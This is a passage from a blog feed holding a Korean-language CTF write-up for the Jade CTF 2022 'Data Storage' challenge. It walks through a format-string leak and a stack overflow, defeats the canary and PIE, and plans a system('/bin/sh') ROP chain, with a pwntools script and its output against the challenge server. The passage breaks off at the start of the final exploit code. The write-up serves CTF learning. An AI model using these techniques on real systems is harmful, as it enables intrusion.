            <tag> NOP Sled </tag>
            
            <tag> base64 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Jade CTF 2022 - Data Storage (canary, pie)</title>
      <link href="/221026-jadectf2022-data_storage/"/>
      <url>/221026-jadectf2022-data_storage/</url>
      
        <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>(32&#x2F;630) solves</p><h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><p>In his DBMS course, Shekhar was learning about CRUD operations. He was taught these operations in SQL, but he wanted to try them out in C. He wrote a program for reading data from input, and then scrambling it so other users can‚Äôt figure out what is stored. He gave me the binary to test it, could you help me out?</p><p>nc 34.76.206.46 10003</p><h3 id="for-player"><a href="#for-player" class="headerlink" title="for player"></a>for player</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">‚îî‚îÄ‚îÄ chall</span><br></pre></td></tr></table></figure><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>Ïπ¥ÎÇòÎ¶¨Í∞Ä ÏûàÍ≥† PIEÎèÑ ÏûàÎã§.. </p><h3 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h3><p>ÏΩîÎìúÎäî Í∞ÑÎã®ÌïòÎã§. main()ÏóêÏÑú database_store()Î•º Ìò∏Ï∂úÌïòÎäîÎç∞ Ïù¥ Ìï®ÏàòÏóê Ï∑®ÏïΩÌïú Î∂ÄÎ∂ÑÏù¥ Ï°¥Ïû¨ÌïúÎã§. Í∑∏ÎûòÏÑú Ïù¥ Ìï®Ïàò ÌïòÎÇòÎßå Î≥¥Î©¥ ÎêúÎã§.</p><h3 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">database_store</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-23Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [rsp+4h] [rbp-23Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [rsp+4h] [rbp-23Ch]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+4h] [rbp-23Ch]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+4h] [rbp-23Ch]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+4h] [rbp-23Ch]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+4h] [rbp-23Ch]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+4h] [rbp-23Ch]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [rsp+4h] [rbp-23Ch]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [rsp+4h] [rbp-23Ch]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [rsp+4h] [rbp-23Ch]</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [rsp+4h] [rbp-23Ch]</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// [rsp+4h] [rbp-23Ch]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">16</span>]; <span class="comment">// [rsp+10h] [rbp-230h] BYREF</span></span><br><span class="line">  <span class="type">char</span> yes[<span class="number">16</span>]; <span class="comment">// [rsp+20h] [rbp-220h] BYREF</span></span><br><span class="line">  <span class="type">char</span> input[<span class="number">520</span>]; <span class="comment">// [rsp+30h] [rbp-210h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v17; <span class="comment">// [rsp+238h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v17 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Are you sure that you want to store data [yes/no]?&quot;</span>);</span><br><span class="line">  fgets(s, <span class="number">10</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  s[<span class="built_in">strcspn</span>(s, <span class="string">&quot;\r\n&quot;</span>)] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;You entered: &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(s);                                    <span class="comment">// fsb</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nIs that correct?&quot;</span>);</span><br><span class="line">  fgets(yes, <span class="number">10</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  yes[<span class="built_in">strcspn</span>(yes, <span class="string">&quot;\r\n&quot;</span>)] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(yes, <span class="string">&quot;yes&quot;</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Now, it&#x27;s time to enter your details&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Note that there is a length given for each field, you have to enter atleast that many characters&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Fill it up with spaces if your input is less&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;Enter your Name(%d), Admission Number(%d), Branch(%d), University(%d), and Address(%d) (in this order):\n&quot;</span>,</span><br><span class="line">    n,</span><br><span class="line">    an,</span><br><span class="line">    b,</span><br><span class="line">    u,</span><br><span class="line">    a[<span class="number">0</span>]);</span><br><span class="line">  gets(input);                                  <span class="comment">// bof</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Scrambling your data so that hackers can&#x27;t steal it...&quot;</span>);</span><br><span class="line">  modify(&amp;name, input, <span class="number">0LL</span>, n);</span><br><span class="line">  v1 = n;</span><br><span class="line">  modify(&amp;admno, input, n, an);</span><br><span class="line">  v2 = an + v1;</span><br><span class="line">  modify(&amp;branch, input, v2, b);</span><br><span class="line">  v3 = b + v2;</span><br><span class="line">  modify(&amp;university, input, v3, u);</span><br><span class="line">  modify(&amp;address, input, u + v3, a[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">memset</span>(input, <span class="number">0</span>, <span class="number">0x200</span>uLL);</span><br><span class="line">  modify(input, &amp;name, <span class="number">0LL</span>, (<span class="type">unsigned</span> <span class="type">int</span>)((<span class="type">int</span>)n / <span class="number">2</span>));</span><br><span class="line">  v4 = (<span class="type">int</span>)n / <span class="number">2</span>;</span><br><span class="line">  modify(&amp;input[(<span class="type">int</span>)n / <span class="number">2</span>], &amp;branch, <span class="number">0LL</span>, (<span class="type">unsigned</span> <span class="type">int</span>)((<span class="type">int</span>)b / <span class="number">3</span>));</span><br><span class="line">  v5 = (<span class="type">int</span>)b / <span class="number">3</span> + v4;</span><br><span class="line">  modify(&amp;input[v5], &amp;admno, <span class="number">0LL</span>, (<span class="type">unsigned</span> <span class="type">int</span>)((<span class="type">int</span>)an / <span class="number">3</span>));</span><br><span class="line">  v6 = (<span class="type">int</span>)an / <span class="number">3</span> + v5;</span><br><span class="line">  modify(&amp;input[v6], &amp;university, <span class="number">0LL</span>, (<span class="type">unsigned</span> <span class="type">int</span>)((<span class="type">int</span>)u / <span class="number">2</span>));</span><br><span class="line">  v7 = (<span class="type">int</span>)u / <span class="number">2</span> + v6;</span><br><span class="line">  modify(&amp;input[v7], &amp;address, <span class="number">0LL</span>, (<span class="type">unsigned</span> <span class="type">int</span>)(a[<span class="number">0</span>] / <span class="number">10</span>));</span><br><span class="line">  v8 = a[<span class="number">0</span>] / <span class="number">10</span> + v7;</span><br><span class="line">  modify(&amp;input[v8], &amp;branch, (<span class="type">unsigned</span> <span class="type">int</span>)((<span class="type">int</span>)b / <span class="number">3</span>), b - (<span class="type">int</span>)b / <span class="number">3</span>);</span><br><span class="line">  v9 = b - (<span class="type">int</span>)b / <span class="number">3</span> + v8;</span><br><span class="line">  modify(&amp;input[v9], &amp;name, (<span class="type">unsigned</span> <span class="type">int</span>)((<span class="type">int</span>)n / <span class="number">2</span>), n - (<span class="type">int</span>)n / <span class="number">2</span>);</span><br><span class="line">  v10 = n - (<span class="type">int</span>)n / <span class="number">2</span> + v9;</span><br><span class="line">  modify(&amp;input[v10], &amp;address, (<span class="type">unsigned</span> <span class="type">int</span>)(a[<span class="number">0</span>] / <span class="number">10</span>), (<span class="type">unsigned</span> <span class="type">int</span>)(a[<span class="number">0</span>] / <span class="number">10</span>));</span><br><span class="line">  v11 = a[<span class="number">0</span>] / <span class="number">10</span> + v10;</span><br><span class="line">  modify(&amp;input[v11], &amp;university, (<span class="type">unsigned</span> <span class="type">int</span>)((<span class="type">int</span>)u / <span class="number">2</span>), (<span class="type">unsigned</span> <span class="type">int</span>)((<span class="type">int</span>)u / <span class="number">4</span>));</span><br><span class="line">  v12 = (<span class="type">int</span>)u / <span class="number">4</span> + v11;</span><br><span class="line">  modify(&amp;input[v12], &amp;admno, (<span class="type">unsigned</span> <span class="type">int</span>)((<span class="type">int</span>)an / <span class="number">3</span>), an - (<span class="type">int</span>)an / <span class="number">3</span>);</span><br><span class="line">  v13 = an - (<span class="type">int</span>)an / <span class="number">3</span> + v12;</span><br><span class="line">  modify(&amp;input[v13], &amp;address, (<span class="type">unsigned</span> <span class="type">int</span>)(<span class="number">2</span> * (a[<span class="number">0</span>] / <span class="number">10</span>)), (<span class="type">unsigned</span> <span class="type">int</span>)(a[<span class="number">0</span>] - <span class="number">2</span> * (a[<span class="number">0</span>] / <span class="number">10</span>)));</span><br><span class="line">  modify(</span><br><span class="line">    &amp;input[a[<span class="number">0</span>] - <span class="number">2</span> * (a[<span class="number">0</span>] / <span class="number">10</span>) + v13],</span><br><span class="line">    &amp;university,</span><br><span class="line">    (<span class="type">unsigned</span> <span class="type">int</span>)((<span class="type">int</span>)u / <span class="number">2</span> + (<span class="type">int</span>)u / <span class="number">4</span>),</span><br><span class="line">    u - ((<span class="type">int</span>)u / <span class="number">2</span> + (<span class="type">int</span>)u / <span class="number">4</span>));</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v17;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÏΩîÎìúÍ∞Ä Î≥µÏû°Ìï¥Î≥¥Ïù¥ÏßÄÎßå(?) Í∏∞Îä• Î∂ÑÏÑùÏùÑ Ìï† ÌïÑÏöîÎäî ÏóÜÎã§. Ï∑®ÏïΩÏ†êÏùÑ Ï∞æÎäî Í≤ÉÏù¥ Î™©ÌëúÏù¥Í∏∞ ÎïåÎ¨∏Ïóê ÌïÑÏöîÌïú Î∂ÄÎ∂ÑÎßå ÏùΩÏúºÎ©¥ ÎêúÎã§.</p><p>Í∑∏Îü¨Î©¥ fsbÏôÄ bofÍ∞Ä ÎåÄÎÜìÍ≥† Î≥¥Ïù¥Îäî Í≤ÉÏùÑ Ï∞æÏùÑ Ïàò ÏûàÎã§.</p><p>fsbÎ°ú ÌïÑÏöîÌïú Í≤ÉÏùÑ leakÌïòÍ≥† bofÎ•º Ïù¥Ïö©Ìï¥ÏÑú ROPÎ•º ÌïòÎ©¥ ÎêúÎã§. ÎßêÏùÄ Ïù¥Î†áÍ≤å Í∞ÑÎã®ÌïòÏßÄÎßå ÏùµÏä§ÌïòÎäîÎç∞ ÍΩ§ÎÇò Ïò§ÎûòÍ±∏Î†∏Í≥† ÏÉùÍ∞ÅÎ≥¥Îã§ Ïä§Ìä∏Î†àÏä§Î•º Î∞õÏïòÏóàÎã§.</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>local Í∏∞Ï§ÄÏúºÎ°ú ÏùµÏä§Î•º ÏûëÏÑ±ÌñàÎäîÎç∞ remoteÎäî Ïûò ÎêòÏßÄ ÏïäÎäî Î¨∏Ï†ú(?)Í∞Ä Î∞úÏÉùÌñàÎã§. (Î°úÎêòÎ¶¨Ïïà „Öú)</p><p>localÍ≥º remoteÏùò libcÍ∞Ä Îã¨ÎùºÏÑú Ïä§ÌÉùÏóê Í∞íÏù¥ ÏåìÏù¥ÎäîÍ≤å Îã¨ÎùºÏ°åÎã§. Í∑∏ÎûòÏÑú leakÌï† offsetÏùÑ Î£®ÌîÑÎ•º ÎèåÎ†§ÏÑú Ï∞æÎäî Í≥ºÏ†ïÏù¥ Ï∂îÍ∞ÄÏ†ÅÏúºÎ°ú ÌïÑÏöîÌïòÎã§.</p><p>ÏïÑÎûòÎ∂ÄÌÑ∞ remote Í∏∞Ï§ÄÏúºÎ°ú ÏÑ§Î™ÖÏùÑ ÌïúÎã§.</p><h3 id="Exploit-Scenario"><a href="#Exploit-Scenario" class="headerlink" title="Exploit Scenario"></a>Exploit Scenario</h3><ul><li>ÏÇ¨Ï†Ñ ÏûëÏóÖ: fsbÎ•º Ïù¥Ïö©ÌïòÏó¨ canary, pie offset Ï∞æÍ∏∞</li></ul><ol><li>canary leakÌïòÍ≥† mainÏúºÎ°ú ÎèåÎ¶¨Í∏∞</li><li>pie leakÌïòÍ≥† mainÏúºÎ°ú ÎèåÎ¶¨Í∏∞</li><li>got Ï∂úÎ†•Ìï¥ÏÑú libc Íµ¨ÌïòÍ∏∞</li><li><code>system(&#39;/bin/sh\x00&#39;)</code>ÏúºÎ°ú ÌùêÎ¶Ñ ÎèåÎ¶¨Í∏∞</li></ol><h3 id="pre-work"><a href="#pre-work" class="headerlink" title="pre-work"></a>pre-work</h3><h4 id="leak-canary-amp-pie"><a href="#leak-canary-amp-pie" class="headerlink" title="leak canary &amp; pie"></a>leak canary &amp; pie</h4><p>canary leakÏùÑ ÏúÑÌïú ÏΩîÎìúÎäî ÏïÑÎûòÏôÄ Í∞ôÎã§.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;34.76.206.46&#x27;</span>, <span class="number">10003</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">off = <span class="number">30</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        find_canary = <span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(off)+<span class="string">&#x27;$p&#x27;</span></span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;]?\n&#x27;</span>, find_canary)</span><br><span class="line">        off = off+<span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">        leak = p.recvline()</span><br><span class="line">        canary = <span class="built_in">int</span>(leak[<span class="number">2</span>:],<span class="number">16</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(off-<span class="number">1</span>, <span class="built_in">hex</span>(canary))</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#log.info(hex(canary))</span></span><br><span class="line">        </span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;correct?\n&#x27;</span>, <span class="string">b&#x27;yes&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x210</span>-<span class="number">0x8</span>)</span><br><span class="line">        payload += p64(canary)</span><br><span class="line">        payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">0x8</span></span><br><span class="line">        payload += <span class="string">b&#x27;\x78\x15&#x27;</span> <span class="comment"># ret</span></span><br><span class="line"></span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;:\n&#x27;</span>, payload)</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;]?\n&#x27;</span>)             <span class="comment">######## !!! ########</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="comment">#p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">        p = remote(<span class="string">&#x27;34.76.206.46&#x27;</span>, <span class="number">10003</span>)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>Ï†úÏùº Î®ºÏ†Ä Ìï¥ÏïºÌï† ÏùºÏùÄ canaryÎ•º leakÌïòÎäî Í≤ÉÏù¥Îã§. offsetÏùÑ Ï∞æÍ∏∞ ÏúÑÌï¥ÏÑú Î£®ÌîÑÎ•º Îèå Îïå try-exceptÏùÑ Ïù¥Ïö©Ìï¥ÏÑú ÏòàÏô∏Ï≤òÎ¶¨Î•º Ìï¥Ï£ºÏóàÎã§. ÎßåÏïΩ ÏòàÏô∏Í∞Ä Î∞úÏÉùÌïúÎã§Î©¥ Îã§Ïãú remoteÏóê Ïó∞Í≤∞Ìï¥Ï£ºÏóàÎäîÎç∞, <code>p.close()</code>Î•º ÏïàÌï¥Ï§ÄÎã§Î©¥ ÌîÑÎ°úÏÑ∏Ïä§Í∞Ä Í≥ÑÏÜç ÏÇ¥ÏïÑÏûàÍ∏∞ ÎïåÎ¨∏Ïóê remoteÏóê ÏÉàÎ°ú Ïó∞Í≤∞Ìï¥Ï£ºÍ∏∞ Ï†ÑÏóê closeÎ•º Ìï¥Ï£ºÏñ¥Ïïº ÌïúÎã§.</p><p>fsbÎ•º Ïù¥Ïö©Ìï¥ÏÑú leakÌïòÍ≥† Ïú†Ìö®Ìïú Ï£ºÏÜåÎ•º Í∞ÄÏ†∏Ïò§Îäî Í≥ºÏ†ïÏóêÏÑú ÏòàÏô∏Í∞Ä Î∞úÏÉùÌï† Í∞ÄÎä•ÏÑ±Ïù¥ Ï°¥Ïû¨ÌïúÎã§. Ï£ºÏÜåÎ•º Ï∂úÎ†•Ìï† Îïå 16ÏßÑÏàò Í∞íÏù¥Í±∞ÎÇò <code>(nil)</code>ÏùÑ Ï∂úÎ†•Ìï¥Ï£ºÎäîÎç∞ ÌõÑÏûêÏùº Í≤ΩÏö∞ <code>int(leak, 16)</code>ÏóêÏÑú ÏóêÎü¨Í∞Ä Î∞úÏÉùÌïòÍ∏∞ ÎïåÎ¨∏Ïóê exceptÏúºÎ°ú Í∞ÄÏÑú ÏòàÏô∏Ï≤òÎ¶¨Î•º Ìï¥Ï§Ñ Ïàò ÏûàÎã§. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[+] Opening connection to 34.76.206.46 on port 10003: Done</span><br><span class="line">invalid literal for int() with base 16: b&#x27;il)\n&#x27;</span><br><span class="line">[*] Closed connection to 34.76.206.46 port 10003</span><br></pre></td></tr></table></figure><p>Î£®ÌîÑÍ∞Ä ÎÅùÎÇòÍ≥† pauseÎ•º Ìï¥Ï§¨Í∏∞ ÎïåÎ¨∏Ïóê Î©àÏ∂îÎäî Í≥≥ÏùÑ Î≥¥Î©¥ Î∞îÎ°ú canaryÎ•º Ï∞æÏùÑ Ïàò ÏûàÎã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[+] Opening connection to 34.76.206.46 on port 10003: Done</span><br><span class="line">77 0x8a3ffc38e32e9500</span><br><span class="line">[*] Paused (press any to continue)</span><br></pre></td></tr></table></figure><p>offsetÏùÄ 77ÏûÑÏùÑ Î∞îÎ°ú Ïïå Ïàò ÏûàÎã§. </p><p>pauseÌïòÎäî Ï°∞Í±¥ÏùÄ Ï£ºÏÑùÏóê <code>!!!</code>Ìïú Í≥≥ÏùÑ Î≥¥Î©¥ Ïïå Ïàò ÏûàÎã§. <code>]?\n</code>ÏùÄ Ïù¥ Ìï®Ïàò Ï¥àÎ∞òÏóê Ï∂úÎ†•ÌïòÎäî Î¨∏ÏûêÏó¥ Ï§ë ÏùºÎ∂ÄÏù¥Îã§. retÎ•º Ïù¥ Ìï®ÏàòÎ°ú ÎèåÎ†§Ï£ºÏóàÍ∏∞ ÎïåÎ¨∏Ïóê Ïù¥Í≤ÉÏù¥ Ï∂úÎ†•ÎêúÎã§Î©¥ leakÌïú Í∞íÏù¥ canaryÏûÑÏùÑ Î∞îÎ°ú ÌôïÏù∏Ìï† Ïàò ÏûàÎã§.</p><p>ÏÇ¨Ïã§ canaryÍ∞Ä Íµ¨Ìï¥Ï†∏ÎèÑ Î∞îÎ°ú retÎ°ú ÎèåÎ¶¥ ÏàòÍ∞Ä ÏóÜÎã§. ÏôúÎÉêÌïòÎ©¥ pie baseÏùò Í∞íÏù¥ ÎûúÎç§Ïù¥Í∏∞ ÎïåÎ¨∏Ïóê ÏïÑÎûòÏôÄ Í∞ôÏùÄ baseÏù¥Í∏∏ Í∏∞ÎåÄÌï¥ÏïºÌïúÎã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x561aa9000000</span><br></pre></td></tr></table></figure><p>ÎÇ¥Í∞Ä ÎèåÎ¶¨Í≥† Ïã∂ÏùÄ Ï£ºÏÜåÎäî <code>pie_base + 0x1578</code>Ïù∏Îç∞ ÎîîÎ≤ÑÍπÖÏùÑ ÌïòÎã§Î≥¥Î©¥ <code>0x01578</code>Ïù¥ Í≥†Ï†ïÏù∏ Í≤ÉÏùÑ Ïïå Ïàò ÏûàÎã§. 2.5Î∞îÏù¥Ìä∏Í∞Ä Í≥†Ï†ïÏù∏Îç∞ 0.5Î∞îÏù¥Ìä∏Îßå Ïì∏ Ïàò ÏóÜÏúºÎãà 2Î∞îÏù¥Ìä∏Îßå ÎçÆÏùÑ Ïàò ÏûàÎã§. retÎ•º 2Î∞îÏù¥Ìä∏Îßå ÎçÆÏúºÎ©¥ Ïñ¥Ï∞®Ìîº ÎÅùÏóê nullÏù¥ ÏûêÎèôÏúºÎ°ú Î∂ôÍ∏∞ ÎïåÎ¨∏Ïóê 1&#x2F;16Ïùò ÌôïÎ•†Î°ú ÎÇ¥Í∞Ä ÏõêÌïòÎäî Ìï®ÏàòÎ°ú ÌùêÎ¶ÑÏùÑ ÎèåÎ¶¥ Ïàò ÏûàÍ≤å ÎêúÎã§.</p><p>canary leakÏùÑ ÏÑ±Í≥µÌïòÍ≥† ÌùêÎ¶Ñ ÎèåÎ¶¨Îäî Í≤ÉÎèÑ ÏÑ±Í≥µÌïòÎ©¥ Ïù¥Ï†ú pie leakÏùÑ ÌïòÎ©¥ ÎêúÎã§. pie leakÎèÑ canaryÎ•º leakÌïú Í≤ÉÍ≥º ÎèôÏùºÌïòÍ≤å ÏßÑÌñâÌïòÎ©¥ ÎêúÎã§. Îã§Îßå Ï∞®Ïù¥Ï†êÏùÄ canaryÎäî ripÎ•º Î∞îÍæ∏Î©¥ÏÑú Í≤ÄÏ¶ùÏù¥ Î∞îÎ°ú ÎêòÏñ¥ÏÑú Ïïå Ïàò ÏûàÎäî Î∞òÎ©¥Ïóê pieÎäî offsetÍ≥º Ìï®Íªò Ï∂úÎ†•Ìï¥Ï£ºÎ©¥ÏÑú pie Ï£ºÏÜåÏù∏ Í≤ÉÏùÑ leakÌïòÎ©¥ ÎêúÎã§.</p><p>Í∑∏Î†áÍ≤å Íµ¨Ìïú leakÌï† pie offsetÏùÄ 85Ïù¥Îã§.</p><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><p>Î¨∏Ï†ú ÌíÄ ÎïåÏùò Í∏∞ÏñµÏùÑ ÏÇ¥Î¶¨Í≥† Ïã∂Ïñ¥ÏÑú Í∑∏ Îïå ÏûëÏÑ±ÌñàÎçò ÏùµÏä§ ÏΩîÎìúÎ•º Í∑∏ÎåÄÎ°ú Ïò¨Î¶∞Îã§.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span 